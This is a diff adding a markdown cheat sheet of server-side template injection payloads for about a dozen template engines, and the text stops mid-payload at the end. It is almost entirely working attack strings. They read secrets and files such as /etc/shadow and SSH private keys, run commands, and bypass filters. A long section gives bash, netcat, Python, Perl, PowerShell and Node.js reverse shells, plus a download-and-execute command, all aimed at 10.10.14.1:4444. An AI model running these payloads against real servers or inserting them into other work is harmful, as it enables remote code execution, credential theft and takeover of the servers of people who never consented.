@@ -1,0 +1,527 @@
+# Complete Server-Side Template Injection (SSTI) Payload Collection - Organized
+
+```bash
+# =============================================================================
+# BASIC DETECTION PAYLOADS - ALL TEMPLATES
+# =============================================================================
+
+# JINJA2 (Python) - Basic Detection
+{{7*7}}
+{{7*'7'}}
+{{'7'*7}}
+{{config}}
+{{self}}
+
+# TWIG (PHP) - Basic Detection
+{{7*7}}
+{{7*'7'}}
+{{'7'*7}}
+{{dump(app)}}
+{{dump(_context)}}
+
+# SMARTY (PHP) - Basic Detection
+{7*7}
+{$smarty.version}
+{php}echo 7*7;{/php}
+
+# FREEMARKER (Java) - Basic Detection
+${7*7}
+#{7*7}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+
+# VELOCITY (Java) - Basic Detection
+$7*7
+#set($x=7*7)$x
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))$ex.waitFor()
+
+# THYMELEAF (Java) - Basic Detection
+${7*7}
+*{7*7}
+#{7*7}
+~{7*7}
+
+# TORNADO (Python) - Basic Detection
+{{7*7}}
+{{7*'7'}}
+{{'7'*7}}
+
+# RAZOR (.NET) - Basic Detection
+@(7*7)
+@{var x = 7*7;}<p>@x</p>
+@System.DateTime.Now
+
+# HANDLEBARS (Node.js) - Basic Detection
+{{7*7}}
+{{'7'*7}}
+{{constructor}}
+
+# MUSTACHE - Basic Detection
+{{7*7}}
+{{'7'*7}}
+{{constructor}}
+
+# DJANGO (Python) - Basic Detection
+{{7*7}}
+{{'7'*7}}
+{{settings}}
+{{request}}
+
+# LIQUID (Ruby) - Basic Detection
+{{7 | minus: 0}}
+{{'7' | times: 7}}
+{{settings}}
+
+# ERB (Ruby) - Basic Detection
+<%= 7*7 %>
+<%= '7'*7 %>
+<%= Dir.pwd %>
+
+# =============================================================================
+# INFORMATION DISCLOSURE PAYLOADS - ALL TEMPLATES
+# =============================================================================
+
+# JINJA2 - Information Disclosure
+{{config.items()}}
+{{self.__dict__}}
+{{request}}
+{{request.environ}}
+{{request.args}}
+{{request.form}}
+{{request.cookies}}
+{{url_for.__globals__}}
+{{get_flashed_messages.__globals__}}
+{{request.__class__}}
+{{config.__class__}}
+
+# TWIG - Information Disclosure
+{{dump(app.request)}}
+{{dump(app.user)}}
+{{dump(app.session)}}
+{{_self}}
+{{_context}}
+{{_self.env}}
+{{_self.env.getGlobals()}}
+
+# SMARTY - Information Disclosure
+{$smarty.server}
+{$smarty.env}
+{$smarty.session}
+{$smarty.cookies}
+
+# FREEMARKER - Information Disclosure
+${.data_model}
+${.globals}
+${.locals}
+${.main_template_name}
+${.current_template_name}
+${.template_name}
+
+# VELOCITY - Information Disclosure
+$class
+$class.inspect("java.lang.System").type.getProperties()
+$class.inspect("java.lang.System").type.getProperty("user.name")
+
+# THYMELEAF - Information Disclosure
+${#ctx}
+${#vars}
+${#locale}
+${#request}
+${#response}
+${#session}
+${#servletContext}
+
+# TORNADO - Information Disclosure
+{{handler}}
+{{handler.settings}}
+{{handler.application}}
+{{handler.request}}
+
+# RAZOR - Information Disclosure
+@ViewBag
+@ViewData
+@Model
+@Request
+@Response
+@System.Environment.UserName
+@System.Environment.MachineName
+@System.Environment.OSVersion
+
+# DJANGO - Information Disclosure
+{{settings.SECRET_KEY}}
+{{settings.DATABASES}}
+{{request.META}}
+{{request.user}}
+{{settings.DEBUG}}
+{{settings.ALLOWED_HOSTS}}
+
+# LIQUID - Information Disclosure
+{{settings.debug}}
+{{request.env}}
+
+# ERB - Information Disclosure
+<%= ENV %>
+<%= Dir.entries('/') %>
+
+# =============================================================================
+# CLASS EXPLORATION & OBJECT ACCESS - ALL TEMPLATES
+# =============================================================================
+
+# JINJA2 - Class Exploration
+{{''.__class__}}
+{{''.__class__.__mro__}}
+{{''.__class__.__mro__[2]}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+
+# HANDLEBARS - Constructor Access
+{{constructor.constructor}}
+{{constructor.constructor.constructor}}
+
+# DJANGO - Class Access (Limited)
+{{request|add:"__class__"}}
+{{request.__class__}}
+{{request.__class__.__mro__}}
+
+# =============================================================================
+# FILE READ OPERATIONS - ALL TEMPLATES
+# =============================================================================
+
+# JINJA2 - File Read
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/shadow').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/home/user/.ssh/id_rsa').read()}}
+
+# SMARTY - File Read
+{php}echo file_get_contents('/etc/passwd');{/php}
+{php}readfile('/etc/shadow');{/php}
+{php}include('/etc/hosts');{/php}
+
+# RAZOR - File Read
+@{System.IO.File.ReadAllText("/etc/passwd")}
+@{System.IO.File.ReadAllText("C:\\Windows\\System32\\drivers\\etc\\hosts")}
+
+# ERB - File Read
+<%= File.read('/etc/passwd') %>
+<%= File.read('/etc/shadow') %>
+<%= File.read('/home/user/.ssh/id_rsa') %>
+
+# =============================================================================
+# BASIC COMMAND EXECUTION - ALL TEMPLATES
+# =============================================================================
+
+# JINJA2 - Command Execution
+{{''.__class__.__mro__[2].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{request.__class__.__init__.__globals__['os'].popen('whoami').read()}}
+
+# TWIG - Command Execution
+{{['id']|filter('system')}}
+{{['whoami']|filter('system')}}
+{{['ls -la']|filter('system')}}
+{{['cat /etc/passwd']|filter('system')}}
+{{['id']|filter('shell_exec')}}
+{{['whoami']|filter('exec')}}
+
+# SMARTY - Command Execution
+{php}system('id');{/php}
+{php}exec('whoami');{/php}
+{php}shell_exec('ls -la');{/php}
+{php}passthru('cat /etc/passwd');{/php}
+
+# FREEMARKER - Command Execution
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("ls -la")}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/passwd")}
+
+# VELOCITY - Command Execution
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))$ex.waitFor()
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))$ex.waitFor()
+
+# THYMELEAF - Command Execution
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(java.lang.System).getProperty('user.name')}
+
+# TORNADO - Command Execution
+{% import os %}{{os.system('id')}}
+{% import subprocess %}{{subprocess.call('whoami', shell=True)}}
+{% import os %}{{os.popen('ls -la').read()}}
+
+# RAZOR - Command Execution
+@{System.Diagnostics.Process.Start("cmd.exe", "/c whoami")}
+@{System.Diagnostics.Process.Start("bash", "-c 'id'")}
+
+# ERB - Command Execution
+<%= system('id') %>
+<%= `whoami` %>
+<%= %x(ls -la) %>
+
+# =============================================================================
+# BYPASS TECHNIQUES - ALL TEMPLATES
+# =============================================================================
+
+# JINJA2 - Filter Bypasses
+{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()")}}{% endif %}{% endfor %}
+{{lipsum.__globals__['os'].popen('whoami').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+
+# TWIG - Filter Bypasses
+{{['id','']|filter('system')|join}}
+{{{'whoami':''}|filter('system')|join}}
+
+# SMARTY - Alternative Syntax
+{php}eval('system("id");');{/php}
+
+# FREEMARKER - API Restriction Bypass
+<#assign classLoader=.main_template_name.class.protectionDomain.classLoader>
+<#assign clazz=classLoader.loadClass("java.lang.Runtime")>
+<#assign runtime=clazz.getMethod("getRuntime",null).invoke(null,null)>
+<#assign process=runtime.exec("id")>
+
+# VELOCITY - ProcessBuilder Alternative
+#set($pb=$class.inspect("java.lang.ProcessBuilder").type)
+#set($process=$pb.newInstance(["whoami"]).start())
+
+# THYMELEAF - ProcessBuilder Alternative
+${T(java.lang.ProcessBuilder).newInstance('id').start()}
+
+# TORNADO - Alternative Execution
+{% import subprocess %}{{subprocess.check_output('whoami', shell=True)}}
+
+# =============================================================================
+# ALL REVERSE SHELL PAYLOADS - ORGANIZED BY TEMPLATE ENGINE
+# =============================================================================
+
+# =============================================================================
+# JINJA2 REVERSE SHELL PAYLOADS
+# =============================================================================
+
+# Bash reverse shells
+{{''.__class__.__mro__[2].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"').read()}}
+{{request.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"').read()}}
+
+# Netcat reverse shells
+{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('nc -e /bin/sh 10.10.14.1 4444').read()}}
+{{request.__class__.__init__.__globals__['os'].popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.1 4444 >/tmp/f').read()}}
+
+# Python reverse shells
+{{config.__class__.__init__.__globals__['os'].popen('python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'10.10.14.1\',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"').read()}}
+
+# Perl reverse shells
+{{''.__class__.__mro__[2].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('perl -e \'use Socket;$i="10.10.14.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'').read()}}
+
+# Bypass filter reverse shells
+{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('bash -i >& /dev/tcp/10.10.14.1/4444 0>&1').read()")}}{% endif %}{% endfor %}
+{{lipsum.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"').read()}}
+{{cycler.__init__.__globals__.os.popen('python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'10.10.14.1\',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"').read()}}
+
+# =============================================================================
+# TWIG REVERSE SHELL PAYLOADS
+# =============================================================================
+
+# Bash reverse shells
+{{['bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"']|filter('system')}}
+{{['bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"']|filter('shell_exec')}}
+
+# Netcat reverse shells
+{{['nc -e /bin/sh 10.10.14.1 4444']|filter('system')}}
+{{['rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.1 4444 >/tmp/f']|filter('system')}}
+
+# Python reverse shells
+{{['python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'10.10.14.1\',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"']|filter('system')}}
+
+# Perl reverse shells
+{{['perl -e \'use Socket;$i="10.10.14.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'']|filter('system')}}
+
+# Map filter reverse shells
+{{{'bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"':''}|filter('system')|join}}
+
+# =============================================================================
+# SMARTY REVERSE SHELL PAYLOADS
+# =============================================================================
+
+# Bash reverse shells
+{php}system('bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"');{/php}
+{php}shell_exec('bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"');{/php}
+
+# Netcat reverse shells
+{php}exec('nc -e /bin/sh 10.10.14.1 4444');{/php}
+{php}system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.1 4444 >/tmp/f');{/php}
+
+# Python reverse shells
+{php}system('python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'10.10.14.1\',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"');{/php}
+
+# Perl reverse shells
+{php}passthru('perl -e \'use Socket;$i="10.10.14.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'');{/php}
+
+# Alternative eval syntax
+{php}eval('system("bash -i >& /dev/tcp/10.10.14.1/4444 0>&1");');{/php}
+
+# =============================================================================
+# FREEMARKER REVERSE SHELL PAYLOADS
+# =============================================================================
+
+# Bash reverse shells
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'")}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("bash -c 'exec bash -i &>/dev/tcp/10.10.14.1/4444 <&1'")}
+
+# Netcat reverse shells
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("nc -e /bin/sh 10.10.14.1 4444")}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.1 4444 >/tmp/f")}
+
+# Python reverse shells
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.1',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\"")}
+
+# Perl reverse shells
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("perl -e 'use Socket;\$i=\"10.10.14.1\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'")}
+
+# ObjectConstructor method
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","bash","-c","bash -i >& /dev/tcp/10.10.14.1/4444 0>&1").start()}
+
+# API restriction bypass
+<#assign classLoader=.main_template_name.class.protectionDomain.classLoader>
+<#assign clazz=classLoader.loadClass("java.lang.Runtime")>
+<#assign runtime=clazz.getMethod("getRuntime",null).invoke(null,null)>
+<#assign process=runtime.exec("bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'")>
+
+# =============================================================================
+# VELOCITY REVERSE SHELL PAYLOADS
+# =============================================================================
+
+# Bash reverse shells
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'"))$ex.waitFor()
+
+# Netcat reverse shells
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("nc -e /bin/sh 10.10.14.1 4444"))$ex.waitFor()
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.1 4444 >/tmp/f"))$ex.waitFor()
+
+# Python reverse shells
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.1',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\""))$ex.waitFor()
+
+# Perl reverse shells
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("perl -e 'use Socket;\$i=\"10.10.14.1\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"))$ex.waitFor()
+
+# ProcessBuilder method
+#set($pb=$class.inspect("java.lang.ProcessBuilder").type)
+#set($process=$pb.newInstance(["bash","-c","bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"]).start())
+
+# =============================================================================
+# THYMELEAF REVERSE SHELL PAYLOADS
+# =============================================================================
+
+# Bash reverse shells
+${T(java.lang.Runtime).getRuntime().exec('bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"')}
+
+# Netcat reverse shells
+${T(java.lang.Runtime).getRuntime().exec('nc -e /bin/sh 10.10.14.1 4444')}
+${T(java.lang.Runtime).getRuntime().exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.1 4444 >/tmp/f')}
+
+# Python reverse shells
+${T(java.lang.Runtime).getRuntime().exec('python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'10.10.14.1\',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"')}
+
+# Perl reverse shells
+${T(java.lang.Runtime).getRuntime().exec('perl -e \'use Socket;$i="10.10.14.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''))}
+
+# ProcessBuilder alternative
+${T(java.lang.ProcessBuilder).newInstance('bash','-c','bash -i >& /dev/tcp/10.10.14.1/4444 0>&1').start()}
+
+# =============================================================================
+# TORNADO REVERSE SHELL PAYLOADS
+# =============================================================================
+
+# Bash reverse shells
+{% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"')}}
+{% import os %}{{os.popen('bash -i >& /dev/tcp/10.10.14.1/4444 0>&1').read()}}
+
+# Netcat reverse shells
+{% import subprocess %}{{subprocess.call('nc -e /bin/sh 10.10.14.1 4444', shell=True)}}
+{% import os %}{{os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.1 4444 >/tmp/f')}}
+
+# Python reverse shells
+{% import subprocess %}{{subprocess.call('python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'10.10.14.1\',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"', shell=True)}}
+
+# Perl reverse shells
+{% import os %}{{os.system('perl -e \'use Socket;$i="10.10.14.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'')}}
+
+# Alternative execution methods
+{% import subprocess %}{{subprocess.check_output('bash -i >& /dev/tcp/10.10.14.1/4444 0>&1', shell=True)}}
+
+# =============================================================================
+# RAZOR REVERSE SHELL PAYLOADS (.NET/WINDOWS)
+# =============================================================================
+
+# PowerShell reverse shells
+@{System.Diagnostics.Process.Start("powershell.exe", "-NoP -NonI -W Hidden -Exec Bypass -Command \"& {$client = New-Object System.Net.Sockets.TCPClient('10.10.14.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}\"")}
+
+# Netcat reverse shells (Windows)
+@{System.Diagnostics.Process.Start("cmd.exe", "/c nc.exe -e cmd.exe 10.10.14.1 4444")}
+
+# PowerShell download and execute
+@{System.Diagnostics.Process.Start("cmd.exe", "/c powershell -c \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.1:8000/shell.ps1')\"")}
+
+# Linux/Mono Razor reverse shells
+@{System.Diagnostics.Process.Start("bash", "-c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'")}
+@{System.Diagnostics.Process.Start("sh", "-c 'nc -e /bin/sh 10.10.14.1 4444'")}
+
+# =============================================================================
+# HANDLEBARS REVERSE SHELL PAYLOADS (NODE.JS)
+# =============================================================================
+
+# Bash reverse shells
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').exec('bash -c \"bash -i >& /dev/tcp/10.10.14.1/4444 0>&1\"');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+# Netcat reverse shells
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').spawn('nc', ['-e', '/bin/sh', '10.10.14.1', '4444']);"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+# Node.js reverse shell
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').exec('node -e \"var spawn = require(\\'child_process\\').spawn; HOST=\\'10.10.14.1\\'; PORT=\\'4444\\'; TIMEOUT=\\'5000\\'; if (typeof String.prototype.contains === \\'undefined\\') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; } function c(HOST,PORT) { var client = new require(\\'net\\').Socket(); client.connect(PORT, HOST, function() { var sh = spawn(\\'/bin/sh\\',[]); client.write(\\'Connected!\\\\n\\'); client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); sh.on(\\'exit\\',function(code,signal){ client.end(\\'Disconnected!\\\\n\\'); }); }); client.on(\\'error\\', function(e) { setTimeout(c(HOST,PORT), TIMEOUT); }); } c(HOST,PORT);\"');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{
